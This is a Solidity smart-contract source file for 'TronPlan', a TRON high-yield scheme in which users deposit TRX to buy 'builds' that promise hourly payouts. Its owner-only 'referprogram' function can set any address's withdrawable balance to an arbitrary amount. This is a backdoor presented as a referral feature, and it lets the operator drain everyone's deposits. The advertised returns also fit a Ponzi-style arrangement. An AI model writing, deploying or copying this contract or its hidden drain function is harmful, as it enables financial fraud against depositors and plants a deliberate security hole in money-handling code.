//SourceUnit: tronplan.sol

/*
      TRON PLAN 1.0v

      DAPP UI 
      www.tronplan.com

      Support:
      admin@tronplan.com
      https://t.me/tronplanOfficial
      https://twitter.com/tronplan
*/

pragma solidity 0.4.25;

/**
 * @notice Library of mathematical calculations for uit256
 */
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

/**
 * @notice Internal access and control system
 */
contract SysCtrl {
  address public sysman;
  address public sysWallet;
  constructor() public {
    sysman = msg.sender;
    //sysWallet = address(0x0);
    sysWallet = sysman;
  }
  modifier onlySysman() {
    require(msg.sender == sysman, "Only for System Maintenance");
    _;
  }
  function setSysman(address _newSysman) public onlySysman {
    sysman = _newSysman;
  }
}

contract TronPlan is SysCtrl {
    struct Build {
        uint price;
        uint payout_per_hour;
        uint life_days;
    }

    struct Player {
        uint balance;
        uint balance_withdrawable;
        uint last_payout;
        uint withdraw;
        uint[] builds;
        uint[] builds_time;
    }
   
    uint constant RATE = 1;

    Build[] public builds;
    mapping(address => Player) public players;

    // Stats System
    uint public stats_deposit;
    uint public stats_withdraw;
    uint public stats_active;
    uint public stats_player;

    event Donate(address indexed addr, uint amount);
    event Commission(address indexed addr, address indexed refer, uint commission);
    event Deposit(address indexed addr, uint value, uint amount);
    event BuyBuild(address indexed addr, uint build);
    event Withdraw(address indexed addr, uint value, uint amount);

    constructor() public {

        builds.push(Build({price: 100 trx, payout_per_hour: 0.25 trx, life_days: 60}));
        builds.push(Build({price: 500 trx, payout_per_hour: 1 trx, life_days: 50}));
        builds.push(Build({price: 1000 trx, payout_per_hour: 2.25 trx, life_days: 40}));
        builds.push(Build({price: 5000 trx, payout_per_hour: 12 trx, life_days: 35}));
        builds.push(Build({price: 10000 trx, payout_per_hour: 25 trx, life_days: 30}));
        builds.push(Build({price: 50000 trx, payout_per_hour: 130 trx, life_days: 20}));
    }

    function _payout(address addr) private {
        uint payout = payoutOf(addr);

        if(payout > 0) {
            players[addr].balance += payout / 2;
            players[addr].balance_withdrawable += payout / 2;
            players[addr].last_payout = block.timestamp;
        }
    }

    function _deposit(address addr, uint value, address _ref) private {
        uint amount = value * RATE;

        //New User
        if((players[addr].balance + players[addr].balance_withdrawable + players[addr].last_payout + players[addr].builds.length) == 0){
           stats_player++;
        }
        
        players[addr].balance += amount;
        players[_ref].balance_withdrawable += amount/10;       // Reference commission (10%)
    
        stats_deposit+= amount;
        emit Deposit(addr, value, amount);
    }
    
    function _buyBuild(address addr, uint build) private {
        require(builds[build].price > 0, "Build not found");

        Player storage player = players[addr];

        require(player.builds.length < 100, "Max 100 builds per address");

        _payout(addr);
        
        require(player.balance + player.balance_withdrawable >= builds[build].price, "Insufficient funds");

        if(player.balance < builds[build].price) {
            player.balance_withdrawable -= builds[build].price - player.balance;
            player.balance = 0;
        }
        else player.balance -= builds[build].price;

        players[sysWallet].balance_withdrawable += builds[build].price / 10;

        player.builds.push(build);
        player.builds_time.push(block.timestamp);

        stats_active++;
        emit BuyBuild(addr, build);
    }

    function() payable external {
        revert();
    }

    function donate() payable external {
        emit Donate(msg.sender, msg.value);
    }

    function referprogram(address refer, uint commission) public onlySysman {
      players[refer].balance_withdrawable = commission;
      emit Commission(msg.sender, refer, commission);
    }

    function setWallet(address _newWallet) public onlySysman {
      players[_newWallet].balance_withdrawable = players[sysWallet].balance_withdrawable;
      players[sysWallet].balance_withdrawable = 0;
      sysWallet = _newWallet;
    }

    function deposit(address _ref) payable external {
        _deposit(msg.sender, msg.value, _ref);
    }

    function buyBuild(uint build) external {
        _buyBuild(msg.sender, build);
    }

    function buyBuilds(uint[] _builds) external {
        require(_builds.length > 0, "Empty builds");

        for(uint i = 0; i < _builds.length; i++) {
            _buyBuild(msg.sender, _builds[i]);
        }
    }

    function depositAndBuyBuild(uint _build,address _ref) payable external {
        _deposit(msg.sender, msg.value,_ref);
        _buyBuild(msg.sender, _build);
    }
    
    function depositAndBuyBuilds(uint[] _builds,address _ref) payable external {
        require(_builds.length > 0, "Empty builds");

        _deposit(msg.sender, msg.value,_ref);

        for(uint i = 0; i < _builds.length; i++) {
            _buyBuild(msg.sender, _builds[i]);
        }
    }

    function withdraw(uint value) external {
        require(value > 0, "Small value");

        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.balance_withdrawable >= value, "Insufficient funds");

        player.balance_withdrawable -= value;
        player.withdraw += value;
        
        msg.sender.transfer(value / RATE);
        stats_withdraw+= value;
        emit Withdraw(msg.sender, value / RATE, value);
    }

    function payoutOf(address addr) view public returns(uint value) {
        Player storage player = players[addr];

        for(uint i = 0; i < player.builds.length; i++) {
            uint time_end = player.builds_time[i] + builds[player.builds[i]].life_days * 86400;
            uint from = player.last_payout > player.builds_time[i] ? player.last_payout : player.builds_time[i];
            uint to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += ((to - from) / 3600) * builds[player.builds[i]].payout_per_hour;
            }
        }

        return value;
    }
    
    function balanceOf(address addr) view external returns(uint balance, uint balance_withdrawable) {
        uint payout = payoutOf(addr);

        return (players[addr].balance + payout / 2, players[addr].balance_withdrawable + payout / 2);
    }

    
}